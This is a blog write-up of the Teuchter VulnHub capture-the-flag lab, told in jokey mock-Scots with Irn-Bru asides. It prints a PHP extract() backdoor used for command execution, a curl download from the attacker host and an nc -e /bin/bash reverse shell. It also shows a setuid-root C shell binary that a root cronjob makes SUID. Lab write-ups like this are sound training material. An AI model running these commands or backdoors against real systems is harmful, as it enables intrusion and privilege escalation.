---
layout: post
title: "Git me some Irn-Bru ye Teuchter!"
date: 2018-10-14 08:21:15 -0400
comments: true
categories: [penetration testing, writeups]
keywords: teuchter, pentest lab, vulnhub, ctf, boot2root, teuchter vulnhub, steghide, irn-bru, scotland
description: Teuchter writeup
---


Today's target is called Teuchter, and yes, apparently that's a word. There is a theme for this machine, and this why this blog post is also..different. ye will need to hang tight to yer sanity for this one. Or drink some Irn-Bru. Ah had to look at other walkthroughs when Ah got stuck and some time was spent checking Scottish references, but it was all worth it!

So, what's a Teuchter? The Wiktionary definition is:

> (derogatory) A Highlander especially if Gaelic-speaking; a rural Scot in general; (in Glasgow and 
> surrounding areas) a Scot with a thick accent from outside west-central Scotland.

Some hints from the author:

> This VM is designed to be a bit of a joke/troll so a translator might be useful.

> The challenge isn't over with root. I've done my usual flag shenanigans.

> A bit of info security research and knowing yer target helps here.

> http://www.jackiestewart.co.uk/jokes/weegie%20windies%202000.htm

And this one:

> Less hochmagandy and more studying is needed for this one!

Ah am sure ye have questions, so:

> hochmagandy - Scottish a mainly jocular or literary word for sexual intercourse 

Isn't this a promising start..

<!-- more -->

Nothing much to start from, just a web server:

``` 
PORT   STATE SERVICE
80/tcp open  http
|_http-title: Dinnae Pwn Ma Server... Away and Hack some bawbag else!
```

On the homepage there is just a GIF and a message:

{% img center /images/pentest/teuchter/web.jpg 'homepage' 'web page' %}

Ran exiftool on the picture and found nothing. However, there are several comments in the source code:

``` 
<!-- Wullie's favourite film is the Breakfast Club -->
<!-- /gallery/ /flicks/ or /telly/ Maybe Jim Kerr can help with the music...?  -->
<!-- not a lot of people know about different extensions, such as .pht for PHP -->
```

Wullie seems to be the central character here..William? Wallace? We do have a Highlander reference above, and it fits the Scottish theme. While Ah was googling, Ah found this gem on the Urban Dictionary:

``` 
Wullie is a very caring person who is easy to get on with,
likes all the joys of life.
Meeting and chating to people from all walks of life.
Also known to like a small shandy or two supports the best scottish team the glasgow rangers.
loves to travel and to get home to the family.
what aload of bull shit wullie
```

Let's get back to the challenge, we have 3 potential web directories to check. In the meantime, Ah have Googled for .pht, since Ah have never seen that extension:

> The pht file extension is associated with the Partial Hypertext file format.

> The pht file stores HTML page that includes a PHP script, dynamically generates HTML, often by 
> accessing database information.

> PHT seems to be very little used format.

> Mime types:
> application/x-httpd-php
> text/html

Back to the web server, /gallery/ is full of pictures, and the title is Dirty Foties..which Ah think stands for dirty feet. Because ye walk a lot..(someone needs some Irn-Bru)

{% img center /images/pentest/teuchter/gallery.png 'dirty foties' 'gallery' %}

There are more hints in the source code:

``` 
<title>Dirty Foties</title>
<body>
<h1>We went on a wee sojourn aboot North Kilt Town and here's whit we saw</h1>
<!-- By now, people will be going doolally. Images will open doors once ye -->
<!-- pick up on the nuances whar's ma glass cheque! -->
<b></b>
Here's something else made from Girders:

<img src="bandit_country.jpg" alt="Andrew Carnegie" height="460" width="968">
<br></br>

<!-- Beware of the milk snatcher -->
<b></b>
Here's where the girders used to come from:
<img src="milk_snatcher.jpg" alt="Margaret Roberts" height="409" width="615" align="centre">
<br></br>

<b></b>
Wee hoose on the corner:
<img src="embra.jpg" alt="Castle" height="409" width="615" align="centre">
<br></br>

<!-- The video gives triggers to the gallery -->

<!-- Definatly need to find that coded message -->
<b></b>
<img src="bigwheel.jpg" alt="Rotating Station" height="460" width="968" align="centre">
<br></br>

<b></b>
Then we bumped into Mr Corleone:
<img src="horse_heid.jpg" alt="Kelpies" height="409" width="615" align="centre">
```

North Kilttown is a Scottish town from The Simpsons. Ah searched for the word doolally, even though Ah got the gist from the context. From Wikipedia:

> "Doolally", originally "doolally tap", meaning to 'lose one′s mind', derived from the boredom felt
> at the Deolali British Army transit camp. 

The Urban Dictionary has another priceless definition for a glass cheque:

> A Glaswegian term: Describes a special glass bottle, containing Irn-Bru, or other similar soft 
> drink, available in many cornershops in Scotland. The bottle is returnable and currently attracts a
> 25p refund when ye give the bottle back to the shop. Called a cheque as they are often collected 
> and cashed (like a cheque)by students and cheap bastards alike either to buy more Bru, or with 
> enough bottles, some skag.

If ye're not curious about what something called Irn-Bru is, ye're a bawheid!

> The ultimate hangover cure. Tastes best when consumed directly from a 750ml glass bottle.

> Another one of Scotland's many national identities.

> Scotland is the only country in the world that produces a soft drink that outsells Coca Cola.

Ah must try some Irn-Bru! By the way, if ye were wondering, the "Wee hoose on the corner" is nothing spectacular...only the Edinburgh Castle! The Kelpies are 30-metre-high horse-head sculptures featuring kelpies...so what are kelpies? +1 to mythology skill:

> Kelpie, or water kelpie, is the Scots name given to a shape-shifting water spirit inhabiting the 
> lochs and pools of Scotland. It has usually been described as appearing as a horse, but is able to
> adopt human form

How did Ah get in this spiral? Ah had a box to hack..ye know what would help me focus? It starts with Irn and ends with Bru!

The /flicks/ directory gives a 403 Forbidden error, but also discloses the web server version, which is Apache/2.4.18 (Ubuntu) Server

The /telly/ directory also has a picture and 2 videos, along with more hints:

``` 
<title>STV Embra</title>
<body>
<h1>Here's some telly programs fur ye!</h1>
<!-- Mind the hidden messages -->
<b></b>
<img src="STV.jpg" alt="STV" height=300" width="400">
<br></br>

Now for some adverts....
<br></br>
<!-- noise up those crazy yanks 1st hint to a password -->
<video height="300" width="400" controls>
<source src="girders.ogv" type="video/ogg">
</video>
<!-- next hint, see how many people make the connection  -->
<!-- between A.G. Barr and the gallery... Aled Jones eh? -->
<video height="300" width="400" controls>
<source src="aled.ogv" type="video/ogg">
</video>
<br></br>


<!-- Third video gives triggers to the flicks phpinfo -->
By the way, it's only aboot 250 weeks ti Christmas!
<br></br>
```

In case ye forgot about Irn-Bru, here's a reminder:

> A.G. BARR p.l.c., commonly known as Barr's, is a Scottish soft drink manufacturer, based in 
> Cumbernauld, Scotland. It manufactures the popular Scottish drink, Irn-Bru

Back to the challenge...but it would be easier if Ah had some Irn-Bru! At this point, the only actionable hint Ah could understand was the one about phpinfo. There is no third video on the page, so Ah just tried navigating to http://192.168.145.131/flicks/phpinfo.php, which didn't work. Following on the hint about .pht extensions, Ah changed it to http://192.168.145.131/flicks/phpinfo.pht and got a blank page instead. 

After some Googling and drooling over Irn-Bru, Ah found a blog post about [PHP Backdoors: Hidden With Clever Use of Extract Function](https://blog.sucuri.net/2014/02/php-backdoors-hidden-with-clever-use-of-extract-function.html). It explains about a seemingly innocuous backdoor with the code:

``` 
@extract ($_REQUEST); 
@die ($ctime($atime));
```

> The extract() function imports variables into the local symbol table from an array.

> This function uses array keys as variable names and values as variable values. For each element it
> will create a variable in the current symbol table. 

The blog post is a very interesting read, and the applicable item is that the code is extracting content sent via GET/POST requests and creating variables that are then executed with the format <code>execute ctime with atime as argument</code>

Following the example, running http://192.168.145.131/flicks/phpinfo.pht?ctime=system&atime=whoami returns www-data, so we have achieved command execution! Time for an Irn-Bru break...

Doing very light enumeration, Ah found out that netcat is available on the target, so Ah fired up a listener and tried using netcat to serve a shell on my listener, but it didn't work. So Ah used Python's SimpleHTTPServer to transfer my netcat to the target system. Note that ye have to use URL encoding: <code>http://192.168.145.131/flicks/phpinfo.pht?ctime=system&atime=curl%20http%3A%2F%2F192.168.145.129%2Fnc%20--output%20nc</code>

The binary was downloaded to <code>/var/www/html/flicks</code>. Ah made it executable and ran it, but nothing happened. Next, Ah moved it to /tmp and ran it from there with <code>192.168.145.131/flicks/phpinfo.pht?ctime=system&atime=%2Ftmp%2Fnc%20192.168.145.129%208080%20-e%20%2Fbin%2Fbash</code> and it worked:

``` 
nc -vnlp 8080
listening on [any] 8080 ...
connect to [192.168.145.129] from (UNKNOWN) [192.168.145.131] 49172
whoami
www-data
``` 

We have a reverse shell, but it's very limited. The usual Python shell spawning didn't work, because on the box there's actually Python 3. Which only changes things slightly: <code>python3 -c "import pty; pty.spawn('/bin/bash');"</code>

``` 
python3 -c "import pty; pty.spawn('/bin/bash');"
www-data@teuchter:/var/www/html/flicks$ ls /home
ls /home
cpgrogan  jkerr  proclaimers
```

Inside cpgrogan there's a kochanski directory that we're not permitted to view. In jkerr's home there's an empty .sudo_as_admin_successful file, but we find a hint about jkerr's password:

``` 
www-data@teuchter:/home/jkerr$ cat login.txt
cat login.txt
Jim,

Ah decided to rename yer account to jkerr and reset the password
ye'll find it in the photo. Just remember the decode password
dosn't have a space.

If ye can't figure it out, it's the new name for Jonny & the
Self-Abusers...
```

And inside proclaimers there are 2 directories. We can't enter 500miles, but inside letterfromamerica there are 2 interesting files belonging to root:

``` 
www-data@teuchter:/home/proclaimers/letterfromamerica$ ls -alh
ls -alh
total 164K
drwxr-xr-x 2 proclaimers proclaimers 4.0K Aug 11  2016 .
drwxr-xr-x 5 proclaimers proclaimers 4.0K Sep 23  2016 ..
-rwsr-xr-x 1 root        root        151K Aug 11  2016 semaphore
-r-Sr-sr-t 1 root        root          42 Jul  9  2016 test
``` 

Inside test there is some kind of message, stating that "So Claire was right about those wildcards", and semaphore is an executable. Running it gives a shell under the same user account. Probably need more information (or Irn-Bru) before exploiting this.

Back to the next step, did a su to jkerr and used *breakfastclub* as a password and it worked! Ah used Python to transfer the images to my machine and broke my shell in the process:

``` 
jkerr@teuchter:~$ python3 -m http.server 8080
python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 ...
192.168.145.129 - - [13/Oct/2018 18:33:23] "GET / HTTP/1.1" 200 -
192.168.145.129 - - [13/Oct/2018 18:33:23] code 404, message File not found
192.168.145.129 - - [13/Oct/2018 18:33:23] "GET /robots.txt HTTP/1.1" 404 -
192.168.145.129 - - [13/Oct/2018 18:33:24] code 404, message File not found
192.168.145.129 - - [13/Oct/2018 18:33:24] "GET /favicon.ico HTTP/1.1" 404 -
192.168.145.129 - - [13/Oct/2018 18:33:24] code 404, message File not found
192.168.145.129 - - [13/Oct/2018 18:33:24] "GET /favicon.ico HTTP/1.1" 404 -
192.168.145.129 - - [13/Oct/2018 18:33:27] "GET /promisedyeamiracle.jpg HTTP/1.1" 200 -
192.168.145.129 - - [13/Oct/2018 18:33:29] "GET /breakfastclub.jpg HTTP/1.1" 200 -
```

An Irn-Bru would have prevented that mistake! After redoing the steps, Ah ran exiftool on the downloaded images and found a base64 encoded string in promisedyeamiracle.jpg:

``` 
Copyright                       : Z2VtaW5pCg==
```

Decoded, it means *gemini*. Ah didn't know what to do with this, so Ah googled for the other user accounts.

cpgrogan:

> Claire Patricia Grogan (born 17 March 1962), known professionally as Clare Grogan or sometimes as 
> C. P. Grogan, is a Scottish actress and singer. She is best known as the lead singer of the 1980s 
> new wave music group Altered Images and for supporting roles in the 1981 film Gregory's Girl and 
> the science fiction sitcom Red Dwarf as the first incarnation of Kristine Kochansk

proclaimers:

> The Proclaimers are a Scottish music duo composed of twin brothers Charlie and Craig Reid (born 5 
> March 1962). They are best known for their songs "I'm Gonna Be (500 Miles)", "Sunshine on Leith", 
> "I'm On My Way" and "Letter from America", and their singing style with a Scottish accent

Well, we don't need an Irn-Bru to connect the dots, gemini, twins! That is actually the password for the proclaimers account. Now to get back to the folders from before:

``` 
proclaimers@teuchter:~/500miles$ ls -alh
ls -alh
total 228K
drwx------ 2 proclaimers proclaimers 4.0K Jul  9  2016 .
drwxr-xr-x 5 proclaimers proclaimers 4.0K Sep 23  2016 ..
-rw-rw---- 1 proclaimers proclaimers 8.0K Jun 30  2016 choclate_lassie.jpg
-rw-rw---- 1 proclaimers proclaimers  97K Jun 30  2016 city_discovery.jpg
-rw-rw---- 1 proclaimers proclaimers 8.5K Jun 30  2016 night_oot_teuchters.jpg
-rw-rw---- 1 proclaimers proclaimers  87K Jun 30  2016 Restless-Natives-Scotland.jpg
-rw-rw---- 1 proclaimers proclaimers  11K Jun 30  2016 SPT_red.jpg
```

Ah downloaded the images in case of need and out of curiosity. Then it was back to the semaphore. Ah grepped for files containing the word semaphore, and tried avoiding being flooded by irrelevant results like libraries. Eventually, Ah got a hit under */usr/local*, in the <code>/usr/local/bin/numpties.sh</code> file:

``` 
#!/bin/sh

## Right, time to sort out these numpties that put PHP shells on ma server!

## Steal a copy to examine later
/bin/tar czvf /root/shells.tgz /var/www/html/*.php

## Aww they dobbers with primative Egpytian Encryption can away and raffle themselves
sudo apt-get -y purge openssh-server sftp wget 

## Delete the shells to annoy the eejits
/bin/rm -rf /var/www/html/*.php

## Plant a semaphore in to alert the monitoring system
if /usr/bin/[ -f /home/proclaimers/letterfromamerica/semaphore ]
  then
    /bin/chown root.root /home/proclaimers/letterfromamerica/semaphore
    /bin/chmod 4755 /home/proclaimers/letterfromamerica/semaphore
fi
```

Back to the dictionaries it is, and memory alert, Ah remembered being called a numpty once!

> numpty - A person who is incapable of performing the simplest of task correctly. Usual symptoms 
> include poor hand-eye coordination, zero common sense and the general illusion that they are 
> special (caused by parents referring to them as such and the numpty not fully grasping the meaning
> implied).

> Common causes are being dropped as a baby or repeated heavy blows to head in later life.

> dobber - A Glasgow term for a dick head or in general just a stupid cunt.

Now for the code, attempts to put PHP shells on the server fail because the shells get deleted. Also, a couple of file transfer utilities have been removed (the reason why Ah resorted to curl). It looks like this might be used in a cronjob. Finally, if the semaphore file exists, its owner is changed to root and the SUID bit is set. Which means, we can create a semaphore file that would allow us to become root if it were SUID.

On my box, Ah compiled an executable (no GCC on the target) with the following C code:

``` 
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}
```

Ah made it executable for everyone and transfered it to the target, again with curl:

``` 
curl http://192.168.145.129/rootme --output ./semaphore     
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 16712  100 16712    0     0  1002k      0 --:--:-- --:--:-- --:--:-- 1020k
```

Waited a while, thought about some Irn-Bru, came back and got root!

``` 
./semaphore
root@teuchter:~/letterfromamerica#
```

Finding the flag is usually the last step, but not on knightmare's machines!

``` 
oot@teuchter:/root# ls -alh
ls -alh
total 1.1M
drwx------  5 root root 4.0K Nov  2  2016 .
drwxr-xr-x 23 root root 4.0K Nov  2  2016 ..
drwx------  2 root root 4.0K Nov  2  2016 .aptitude
-rw-r--r--  1 root root 3.1K Oct 22  2015 .bashrc
drwx------  2 root root 4.0K Nov  2  2016 .cache
-rw-r--r--  1 root root 1.1M Jul  9  2016 flag.jpg
-rw-r--r--  1 root root  108 Sep 23  2016 flag.txt
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwx------  3 root root 4.0K Aug  1  2016 re-record-not-fade-away
-rw-r--r--  1 root root   75 Jul  9  2016 .selected_editor
-rw-r--r--  1 root root   45 Oct 13 20:00 shells.tgz
-rw-------  1 root root 3.4K Nov  2  2016 .viminfo
```

Ah transfered the flag.jpg to my machine with netcat, but no metadata that could help. The text file is not the right one, obviously:

``` 
root@teuchter:/root# cat flag.txt 
cat flag.txt
Ah say! Ah say! Ah say boy! Y'all interested in hochmagandy again...?

Y'all know this aint the correct flag! 
```

Looking around further:

``` 
root@teuchter:/root/re-record-not-fade-away# ls 
ls 
FeelsLikeHeaven  on
cat FeelsLikeHeaven
Yer pure no gonna find the flag... A pit it in a bottle of Red Kola
```

The directory tree goes...on..and on...Ah used a Python script to solve this annoyance:

{% codeblock lang:python %} 
import os
 
startdir = '.'
for dir, subdir, files in os.walk(startdir):
    print('Found directory: %s' % dir)
    for f in files:
        print('\t%s' % f)
{% endcodeblock %}

``` 
root@teuchter:/root/re-record-not-fade-away# python3 dir.py
python3 dir.py
Found directory: .
	FeelsLikeHeaven
	dir.py
Found directory: ./on
Found directory: ./on/and
Found directory: ./on/and/on
Found directory: ./on/and/on/and
Found directory: ./on/and/on/and/on
Found directory: ./on/and/on/and/on/and
Found directory: ./on/and/on/and/on/and/on
Found directory: ./on/and/on/and/on/and/on/and
Found directory: ./on/and/on/and/on/and/on/and/on
Found directory: ./on/and/on/and/on/and/on/and/on/and
Found directory: ./on/and/on/and/on/and/on/and/on/and/ariston
	TeuchterESX.zip
```

Inside this madness there's a 12M archive. Ah moved it to a sane location, transfered it to my machine, and attempted to extract it, but it was password protected. No need for cracking, guessing from all the options, the password is *Teuchter*:

``` 
unzip TeuchterESX.zip 
Archive:  TeuchterESX.zip
[TeuchterESX.zip] TeuchterESX.vmdk password: 
  inflating: TeuchterESX.vmdk        
```

A VMDK disk. There's actually a hint for this inside root's crontab entries:

``` 
## So vmfs-tools package eh....?
*/5 * * * * /bin/sh /usr/local/bin/numpties.sh > /dev/null 2>&1
```

Let's see what the package does:

``` 
apt-cache show vmfs-tools
Package: vmfs-tools
Source: vmfs-tools (0.2.5-1)
Version: 0.2.5-1+b2
Installed-Size: 256
Maintainer: Mike Hommey <glandium@debian.org>
Architecture: amd64
Depends: libc6 (>= 2.14), libfuse2 (>= 2.6), libuuid1 (>= 2.16)
Size: 53964
SHA256: 39379758d08827726308ea6ccf76de0cc403ba94d1bcdec9127a120bbf4b050a
SHA1: 7db639825b49cabb9d9081dd22ca94813cf335b6
MD5sum: ee9aa037a69d28f6db694632d0f7a106
Description: Tools to access VMFS filesystems
 VMFS is a clustered filesystem designed to store virtual machine disks for
 VMware ESX or ESXi Server hosts. This set of tools allows to access these
 filesystems from some other non ESX/ESXi host for e.g. maintenance tasks.
 .
 Only read access is available at the moment, but write access is under
 works. Multiple extents are supported.
 .
 The VMFS can be accessed with a command line tool or mounted through a
 userspace filesystem (FUSE-based).
Description-md5: 0cdea504f6c5a9da0070eeda2f011352
Tag: admin::filesystem, admin::kernel, admin::virtualization,
 implemented-in::c, role::program
Section: otherosfs
Priority: extra
Filename: pool/main/v/vmfs-tools/vmfs-tools_0.2.5-1+b2_amd64.deb
```

Ah installed the package, and then hit a standstill on how to actually mount the virtual disk. After trying several approaches and failing, what worked was attaching the VMDK to my Kali virtual machine from the host. Ah had to change the compatibility of my VM for that to work, but it could possibly also work by editing the VMDK and changing *ddb.virtualHWVersion* to a version matching the VM's compatibility, but Ah haven't tried that. After doing it like that, Ah was able to see the disk under */dev/sdb1*:

``` 
fdisk -l
Disk /dev/sdb: 2 GiB, 2147483648 bytes, 4194304 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: gpt
Disk identifier: AD5D7662-CD00-4621-AF02-68A05AD0A688

Device     Start     End Sectors Size Type
/dev/sdb1   2048 4194270 4192223   2G VMware VMFS


Disk /dev/sda: 40 GiB, 42949672960 bytes, 83886080 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: dos
Disk identifier: 0xa89dd27d

Device     Boot    Start      End  Sectors Size Id Type
/dev/sda1  *        2048 79693823 79691776  38G 83 Linux
/dev/sda2       79695870 83884031  4188162   2G  5 Extended
/dev/sda5       79695872 83884031  4188160   2G 82 Linux swap / Solaris
```

Now Ah could mount it and see what's inside:

``` 
root@kali:~# vmfs-fuse /dev/sdb1 /mnt/vmdk
root@kali:~# ls /mnt/vmdk
hint.txt  redkola
```

The hint mentions a password made of 25 characters that we should be able to find from what we've been through:

``` 
cat hint.txt 
Almost there.. Check the ISO and remember password relates to the TV Advert ye watched.

Ah took out the spaces but it's 25 characters but the Wikipedia page will get it for ye.
```

In the redkola (Irn-Bru, anyone?) folder there are more VMDK files, but at least the hint focuses us on the ISO:

``` 
oot@kali:/mnt/vmdk/redkola# ls
redkola_1-flat.vmdk  redkola.iso    redkola.vmsd
redkola_1.vmdk       redkola.nvram  redkola.vmx
```

Ah mounted the ISO next:

``` 
mount -o loop,ro redkola.iso /mnt/redkola
root@kali:/mnt/redkola# ls
glass_ch.jpg
```

{% img center /images/pentest/teuchter/glass_ch.jpg 'glass cheque' 'irn-bru!!!!!!' %}

All that Irn-Bru! And with something extra, perhaps? Enter steghide!

#### steghide

> Steghide  is a steganography program that is able to hide data in various kinds of 
> image- and audio-files. The color- respectivly sample-frequencies  are  not  changed thus making 
> the embedding resistant against first-order statistical tests.

> Features include the compression of the embedded  data,  encryption  of
> the  embedded  data  and automatic integrity checking using a checksum.
> The JPEG, BMP, WAV and AU file formats are supported for use  as  cover
> file. There are no restrictions on the format of the secret data.

Steghide can also be used to check for the presence of a secret message and to extract it, if provided the correct passphrase. Putting together all the hints (scotland, girders, irn-bru wiki page) or just watching and listening to the advert gives us the passphrase <code>madeinscotlandfromgirders</code>

``` 
steghide info glass_ch.jpg 
"glass_ch.jpg":
  format: jpeg
  capacity: 3.9 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "realflag.txt":
    size: 972.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes
```

Aaand, after much pain, we have the flag!

``` 
steghide extract -sf glass_ch.jpg 
Enter passphrase: 
wrote extracted data to "realflag.txt".
```

Achievement unlocked: Unlimited Irn-Bru!

``` 
cat realflag.txt 

Gaun Yersel Big Man! B-)

Congratulations for the fifth time on capturing this flag!

Yes, I know this VM has really got on your nerves, and that was the main
point...

I decided to have some fun with you, and hopefully you have learned some
new ways to look at things. You know, all this could have been avoided
if Siri just leanred what "outwith" means, I wouldn't have to build this
VM. I'm trolling you again of course!

I hope this VM was fun for you, and I'm sure you can now insult people
in another language :-)

Thanks to mrb3n who shared a joke with me and pushing me to set up a VM
for trolling everyone.

Shout-outs yet again to #vulnhub for hosting a great learning tool and
being a great inspiration to make these VMs. A special thanks goes to
mrb3n, cmaddy and GKNSB for repeated testing. Many thanks to g0tM1lk
for providing some valuable feedback and offering to host my CTF again.
                                                           --Knightmare
```


This challenge cost me 1.5 days of the weekend, but it was funny as feck! And Ah learned a couple slang words that will sure come in handy. AND IRN-BRU!!! Which, in case ye haven't figured it out, stands for Iron Brew! Cheers, knightmare!

Just gonna leave this here:

{% img center /images/pentest/teuchter/irn-bru.jpg 'irn-bru' 'iron brew effect' %}

And this:

- https://foodanddrink.scotsman.com/drink/15-facts-about-irn-bru/

It's not over:

``` 
 ________________________________________
/ When I'm a burger, Ah want to be washed \
\ down with Irn-Bru                      /
 ----------------------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```
